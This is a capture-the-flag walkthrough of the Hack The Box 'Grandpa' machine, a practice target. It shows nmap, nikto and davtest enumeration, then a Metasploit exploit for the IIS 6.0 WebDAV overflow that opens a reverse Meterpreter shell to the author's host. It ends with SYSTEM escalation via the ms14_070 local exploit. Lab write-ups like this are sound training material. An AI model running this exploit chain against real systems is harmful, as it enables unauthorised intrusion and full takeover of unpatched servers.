# Hack The Box - Grandpa Walkthrough

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Grandpa]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.14 -Pn                                 
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-03 06:37 EST
Nmap scan report for 10.10.10.14
Host is up (0.20s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Fri, 03 Feb 2023 11:38:14 GMT
|_  WebDAV type: Unknown
|_http-title: Under Construction
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|2000|XP (91%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp1:professional
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows XP SP3 (89%), Microsoft Windows 2000 SP4 (86%), Microsoft Windows XP (86%), Microsoft Windows Server 2003 SP1 - SP2 (85%), Microsoft Windows XP SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.58 seconds
```

We get back the following result showing that only 1 port was open:
- Port `80`: running `Microsoft IIS httpd 6.0`.

Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Grandpa]
└─$ rustscan -a 10.10.10.14 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.14:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80 10.10.10.14

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-03 07:07 EST
Initiating Ping Scan at 07:07
Scanning 10.10.10.14 [2 ports]
Completed Ping Scan at 07:07, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:07
Completed Parallel DNS resolution of 1 host. at 07:07, 0.07s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 07:07
Scanning 10.10.10.14 [1 port]
Discovered open port 80/tcp on 10.10.10.14
Completed Connect Scan at 07:07, 0.13s elapsed (1 total ports)
Nmap scan report for 10.10.10.14
Host is up, received syn-ack (0.18s latency).
Scanned at 2023-02-03 07:07:37 EST for 1s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds

```


```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Grandpa]
└─$ nikto -h http://10.10.10.14                                
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2023-02-03 06:38:17 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (PROPFIND PROPPATCH UNLOCK MKCOL SEARCH COPY LOCK listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8016 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2023-02-03 07:19:33 (GMT-5) (2476 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

## Enumeration
While the `Nikto` scan was running I visited the web application in the browser.

![gp-1](https://user-images.githubusercontent.com/87711310/216601965-bad129f9-f7a5-4ae1-9a10-45eb6a23e8c0.png)

I looked for hidden message or button or some information and looked at the source-code too, but there was nothing. So, I decided to run `Gobuster` to enumerate directories.

```

```


On looking the directories that `gobuster` found, both `/images` and `/_private` were empty dirs.

The scan shows that the `HTTP PUT` method is allowed. This could potentially give us the ability to save files on the web server. Since this is an IIS Microsoft web server, the type of files it executes are ASP and ASPX. So I checked if we’re allowed to upload these file extensions.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Grandpa]
└─$ davtest --url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: 3vZ_Rew
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     jhtml   FAIL
PUT     asp     FAIL
PUT     html    FAIL
PUT     php     FAIL
PUT     aspx    FAIL
PUT     pl      FAIL
PUT     txt     FAIL
PUT     cfm     FAIL
PUT     cgi     FAIL
PUT     jsp     FAIL
PUT     shtml   FAIL

********************************************************
/usr/bin/davtest Summary:

```

Unlike the `Granny` box, there are restrictions put in place that don’t allow us to upload files, so this won’t be the way we gain initial access to the box. Next, I decided to run searchsploit on the web server version.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Grandpa]
└─$ searchsploit Microsoft IIS | grep 6.0
Microsoft IIS - ASP Stack Overflow (MS06-034)                                                                             | windows/local/2056.c
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                          | windows/remote/21057.txt
Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Service                                                     | windows/dos/22670.c
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                   | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                     | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                              | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                    | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                  | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                   | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                               | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                               | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                           | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                  | windows/remote/19033.txt
                                                                                                                                                            
```
From the results we received, I decided to use the `WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow` exploit.


NOTE: While trying to solve this box without Metasploit, the shell I got back was too unstable and therefore, I decided to solve this box using Metasploit.

## Initial Foothold

So I started Metasploit and looked for the exploit on [exploitdb](https://www.exploit-db.com/exploits/41738), and I fount a CVE(# 2017-7269).

```
msf6 > search 2017-7269

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

So, metasploit did have the exploit, so decided to configure and use the exploit.

```
msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.8      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LPORT 7777
LPORT => 7777
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.16.3
LHOST => 10.10.16.3
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.16.3:7777 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.16.3:7777 -> 10.10.10.14:1030 ) at 2023-02-03 08:30:25 -0500
```

On running the exploit, I got back a reverse shell.

```
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 3652 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

now that we got back a shell, but when we run `getuid` command, we get an error. This is because we’re running in an unstable process. To fix that, let’s see which processes are running on the box and migrate to one that is running with the same privileges that the meterpreter session is running with.

```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

So, I migrated to `PID 2964`

```
meterpreter > migrate 2964
[*] Migrating from 3712 to 2964...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > 
```

Now that we have a stable working meterpreter session. We’re running with low privileges, so we’ll need to escalate our privileges to SYSTEM.

Now, I backgrouded the `meterpreter` session, to look for a `Local Exploit suggestor` in msfconsole to check for local vulnerabiltites.

```
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 38 exploit checks are being tried...
msf6 post(multi/recon/local_exploit_suggester) > run
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Now, I used the `ms14_070_tcpip_ioctl` exploit.

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run

[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Exploit completed, but no session was created.
```

Now that the exploit was successful, I went back to my meterpreter session and viewed if I had escalated priviliges

```
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Now, Visiting the user `Harry's` directory and `Admin's` directory, I was able to retrieve the flag.

```
cat "C:\Documents and Settings\Harry\Desktop\user.txt"
[REDACTED]

cat "C:\Documents and Settings\Administrator\Desktop\user.txt"
[REDACTED]
```
